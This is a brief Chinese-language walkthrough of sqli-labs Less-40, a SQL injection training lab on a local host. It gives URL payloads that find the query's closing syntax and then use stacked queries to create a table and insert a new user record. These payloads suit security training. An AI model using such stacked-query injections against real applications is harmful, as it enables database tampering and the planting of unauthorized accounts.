---
title: Less - 40
date: 2023-03-20T19:05:23Z
lastmod: 2023-03-20T19:14:02Z
---

# Less - 40

---

# 通关教程

---

## 1、判断闭合方式

---

```http
http://192.168.23.128/sqli-labs/Less-40/?id=1'
```

​![image](assets/image-20230320191012-jgvau3s.png)​

```http
http://192.168.23.128/sqli-labs/Less-40/?id=1'--+ 
```

​![image](assets/image-20230320191042-nosvufh.png)​

```http
http://192.168.23.128/sqli-labs/Less-40/?id=1')--+
```

​![image](assets/image-20230320191123-bb7bol7.png)​

---

## 2、创建一张表

---

```http
http://192.168.23.128/sqli-labs/Less-40/?id=1');create table test like users;--+
```

​![image](assets/image-20230320191209-0zdqpg4.png)​

​![image](assets/image-20230320191234-kfa3ugq.png)​

---

## 3、创建一个新用户

---

```http
http://192.168.23.128/sqli-labs/Less-40/?id=1');insert into users values(18,'cmx','cmx');--+
```

​![image](assets/image-20230320191334-nrnwac1.png)​

​![image](assets/image-20230320191350-m7j9nv7.png)​
